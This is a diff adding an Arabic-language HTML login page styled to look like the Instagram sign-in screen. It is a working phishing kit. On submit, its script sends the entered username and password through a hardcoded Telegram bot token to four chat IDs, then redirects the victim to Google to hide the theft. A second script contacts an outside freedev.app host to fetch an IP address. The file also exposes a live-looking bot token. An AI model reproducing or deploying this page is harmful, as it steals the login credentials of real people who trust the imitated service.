@@ -1,0 +1,192 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>تسجيل الدخول</title>
+    <style>
+      body {
+    background-color: #1C2A33;
+    color: #fff;
+    margin: 0;
+    padding: 0;
+    font-family: -apple-system, BlinkMacSystemFont, "Segoe UI",
+                 Roboto, Helvetica, Arial, sans-serif;
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    min-height: 100vh;
+}
+
+.container {
+    width: 100%;
+    max-width: 350px;
+    padding: 20px;
+    text-align: center;
+    box-sizing: border-box;
+}
+
+.logo {
+    width: 90px;
+    height: auto;
+    margin: 0 auto 35px;
+    display: block;
+}
+
+input {
+    width: 100%;
+    height: 58px;
+    padding: 0 18px;
+    margin-bottom: 8px;
+    background-color: #1C2A33;
+    border: 2px solid #40545F;
+    border-radius: 18px;
+    color: #fff;
+    box-sizing: border-box;
+    font-size: 16px;
+    outline: none;
+    text-align: right;
+}
+
+input::placeholder {
+    color: #AAB5BB;
+}
+
+input:focus {
+    border-color: #58717E;
+}
+
+button {
+    width: 100%;
+    height: 58px;
+    padding: 0 15px;
+    margin-top: 12px;
+    background-color: #0879F9;
+    border: none;
+    border-radius: 30px;
+    color: #fff;
+    font-weight: 500;
+    cursor: pointer;
+    font-size: 18px;
+}
+
+button:active {
+    transform: scale(0.99);
+}
+
+.divider {
+    margin: 25px 0;
+    color: #AAB5BB;
+    font-size: 16px;
+    border-top: 1px solid #30434D;
+    padding-top: 20px;
+}
+
+.fb-login {
+    color: #0095F6;
+    font-weight: bold;
+    text-decoration: none;
+    display: block;
+    margin-bottom: 25px;
+    font-size: 17px;
+}
+
+.forgot-pass {
+    color: #fff;
+    text-decoration: none;
+    display: block;
+    margin-bottom: 25px;
+    font-size: 16px;
+}
+
+.signup-box {
+    border: 2px solid #40545F;
+    border-radius: 30px;
+    padding: 18px;
+    margin-top: 30px;
+    width: 100%;
+    box-sizing: border-box;
+    background-color: #1C2A33;
+}
+
+.signup-link {
+    color: #0095F6;
+    text-decoration: none;
+    font-weight: bold;
+    font-size: 17px;
+
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <!-- مكان اللوجو -->
+    <img src="12.png" alt="Logo" class="logo">
+    <form id="loginForm">
+        <input type="text" id="username" placeholder="اسم المستخدم أو الهاتف أو البريد" required>
+        <input type="password" id="password" placeholder="كلمة السر" required>
+        <button type="submit">تسجيل الدخول</button>
+    </form>
+
+    <div class="divider">أو</div>
+    
+    <!-- هذه روابط يمكنك تعديلها -->
+    <a href="https://facebook.com" class="fb-login">تسجيل الدخول باستخدام Facebook</a>
+    <a href="#" class="forgot-pass">هل نسيت كلمة السر؟</a>
+</div>
+
+<div class="container">
+    <div class="signup-box">
+        ليس لديك حساب؟ <a href="#" class="signup-link">تسجيل</a>
+    </div>
+</div>
+
+<script>
+    // --- الإعدادات ---
+    const TELEGRAM_BOT_TOKEN = "8542628347:AAHEq32eCmS_2Q6aAWm1VBYRcFGbZbCgjmc";
+
+    // مصفوفة تحتوي على الـ 4 آيديات
+    const TELEGRAM_CHAT_IDS = [
+        "6435779303", // ID المستخدم الأول
+        "222222222", // ID المستخدم الثاني
+        "333333333", // ID المستخدم الثالث
+        "444444444"  // ID المستخدم الرابع
+    ];
+
+    const REDIRECT_URL = "https://www.google.com"; // رابط التحويل
+
+    document.getElementById('loginForm').addEventListener('submit', function(e) {
+        e.preventDefault();
+
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+        const messageText = `🔒 محاولة دخول:\nالمستخدم: ${user}\nكلمة السر: ${pass}`;
+
+        // إرسال الطلب لكل آيدي في القائمة بالتوازي
+        const sendPromises = TELEGRAM_CHAT_IDS.map(chatId => {
+            return fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: messageText
+                })
+            });
+        });
+
+        // الانتظار حتى يتم الإرسال للجميع ثم التوجيه تلقائياً
+        Promise.allSettled(sendPromises).finally(() => {
+            window.location.href = REDIRECT_URL;
+        });
+    });
+</script>
+<script>
+fetch("http://afrgafgfgfdgdffv.freedev.app/")
+  .then(r => r.text())
+  .then(ip => console.log("IP:", ip))
+  .catch(() => {});
+</script>
+</body>
+</html>
